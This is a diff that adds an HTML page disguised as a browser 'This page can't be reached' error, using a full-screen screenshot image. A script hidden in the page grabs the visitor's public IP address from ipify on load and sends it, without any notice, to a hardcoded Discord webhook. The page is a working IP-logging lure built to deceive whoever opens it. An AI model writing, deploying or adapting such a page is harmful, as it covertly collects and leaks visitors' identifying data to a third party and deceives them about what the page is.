@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>This page can't be reached</title>
+
+<style>
+html, body {
+    margin: 0;
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    background: #fff;
+}
+
+img {
+    position: fixed;
+    inset: 0;
+    width: 100vw;
+    height: 100vh;
+    object-fit: cover;
+    user-select: none;
+    pointer-events: none;
+    -webkit-user-drag: none;
+}
+</style>
+</head>
+<body>
+
+<img src="screenshot.png" alt="">
+
+<script>
+(async () => {
+    try {
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await ipResponse.json();
+
+        await fetch("https://discord.com/api/webhooks/1533897792571969750/VhU1BJZ1xdtouRNkctDO4gojtLA_h7XtlIaPEVKv0_Hs-7a7e_6_h774E4RouJMrjIdk", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                "content": ip,
+              
+            })
+        });
+
+        console.log("IP sent.");
+    } catch (err) {
+        console.error("Failed:", err);
+    }
+})();
+</script>
+
+</body>
+</html>
